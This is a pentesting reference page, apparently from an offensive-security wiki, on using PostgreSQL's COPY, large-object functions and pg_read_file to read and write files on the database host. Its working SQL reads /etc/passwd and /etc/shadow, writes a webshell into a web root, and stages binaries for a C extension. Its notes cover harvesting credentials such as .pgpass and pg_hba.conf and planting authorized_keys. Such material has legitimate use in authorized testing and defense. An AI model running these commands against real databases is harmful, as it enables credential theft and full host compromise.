---
title: "PostgreSQL file access: reading and writing host files"
description: "Reading and writing files on the PostgreSQL host through COPY, large objects (lo_import/lo_export), and the pg_read_file and pg_ls_dir server-side functions, to steal secrets, drop payloads, or stage a C extension."
keywords:
  - COPY
  - lo_import
  - lo_export
  - pg_read_file
  - PostgreSQL file read
---

# PostgreSQL file access

PostgreSQL can read and write arbitrary files as its service account, which is useful on its own (stealing configuration, keys, and hashes) and as the staging step for a [C extension](command-execution.md). Superuser gives all of it; some functions are reachable through the `pg_read_server_files` and `pg_write_server_files` roles without full superuser.

## Reading files

```sql
-- whole file into a column
CREATE TABLE f (d text); COPY f FROM '/etc/passwd';
SELECT * FROM f;

-- server-side read functions
SELECT pg_read_file('/etc/passwd');
SELECT pg_ls_dir('/var/lib/postgresql');
```

## Writing files

```sql
-- COPY out: drop a webshell or an authorized_keys file
COPY (SELECT 'content') TO '/var/www/html/shell.php';

-- large objects: import/export arbitrary bytes (stage a .so for a C function)
SELECT lo_import('/etc/shadow', 1234);
SELECT lo_export(1234, '/tmp/shadow.copy');
```

## Exploitation notes

- File **read** harvests the cluster's own secrets (`pg_hba.conf`, the data directory, `~/.pgpass`) and host credentials (`/etc/shadow` if the service runs privileged), feeding further access.
- File **write** lands a webshell under a served path, an `authorized_keys` in the service account's home, or a compiled `.so` to turn into a [C extension function](command-execution.md).
- The large-object route (`lo_import`/`lo_export`) writes raw bytes, which is how you stage a binary that `COPY` text mode would corrupt.
- Writes are bounded by what the **service account** can write, so target paths it owns or serves.

## Tools

- **psql**: run `COPY`, `lo_*`, and `pg_read_file` directly.
- **Metasploit** (`postgres_readfile`): wrapped file read.

## References

- [PostgreSQL: large object functions](https://www.postgresql.org/docs/current/lo-funcs.html)
- [HackTricks: PostgreSQL file read and write](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
